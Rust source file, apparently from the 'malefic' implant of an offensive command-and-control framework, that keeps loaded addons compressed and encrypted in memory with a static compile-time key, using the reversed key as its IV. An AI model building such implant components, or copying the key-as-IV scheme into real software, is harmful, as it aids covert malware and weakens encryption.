#![allow(dead_code)]

use malefic_crypto::compress::{compress, decompress};
use malefic_crypto::crypto::{new_cryptor, Cryptor};
use std::collections::HashMap;

pub struct MaleficAddon {
    pub(crate) name: String,
    pub(crate) r#type: String,
    pub(crate) depend: String,
    pub(crate) content: Vec<u8>,
}

/// Cryptor for addon at-rest storage — always uses the static compile-time KEY,
/// NOT the runtime transport key.  Addon encryption is local memory protection
/// and must not be affected by transport key rotation (switch).
fn make_storage_cryptor() -> Cryptor {
    let key = malefic_config::KEY.to_vec();
    let iv: Vec<u8> = key.iter().rev().cloned().collect();
    new_cryptor(key, iv)
}

pub struct AddonMap {
    addons: HashMap<String, Box<MaleficAddon>>,
}

impl AddonMap {
    pub fn new() -> Self {
        Self {
            addons: HashMap::new(),
        }
    }

    pub fn clear(&mut self) {
        self.addons.clear();
    }

    pub fn iter(&self) -> impl Iterator<Item = (&String, &Box<MaleficAddon>)> {
        self.addons.iter()
    }

    pub(crate) fn insert(&mut self, addon: MaleficAddon) -> anyhow::Result<()> {
        let compressed = compress(&addon.content)?;
        let mut cryptor = make_storage_cryptor();
        let encrypted = cryptor.encrypt(compressed)?;

        let name = addon.name;
        let encrypted_addon = Box::new(MaleficAddon {
            name: name.clone(),
            r#type: addon.r#type,
            depend: addon.depend,
            content: encrypted,
        });

        self.addons.insert(name, encrypted_addon);
        Ok(())
    }

    pub(crate) fn get(&mut self, key: &str) -> anyhow::Result<Box<MaleficAddon>> {
        let encrypted_addon = self
            .addons
            .get(key)
            .ok_or_else(|| anyhow::anyhow!("addon not found: {}", key))?;

        let mut cryptor = make_storage_cryptor();
        let decrypted_content = cryptor.decrypt(encrypted_addon.content.clone())?;

        let decompressed_content = decompress(&decrypted_content)?;

        let decrypted_addon = MaleficAddon {
            name: encrypted_addon.name.clone(),
            r#type: encrypted_addon.r#type.clone(),
            depend: encrypted_addon.depend.clone(),
            content: decompressed_content,
        };
        Ok(Box::new(decrypted_addon))
    }
}
